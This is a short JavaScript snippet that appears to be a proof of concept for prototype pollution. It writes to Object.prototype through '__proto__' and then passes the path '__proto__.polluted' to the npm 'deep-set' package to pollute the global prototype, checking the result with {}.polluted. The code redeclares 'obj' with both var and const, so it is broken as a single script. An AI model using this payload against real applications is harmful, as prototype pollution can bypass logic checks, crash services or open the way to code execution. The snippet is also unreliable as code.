var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const deepSet = require('deep-set');
const obj = { 1: '2' };
deepSet(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);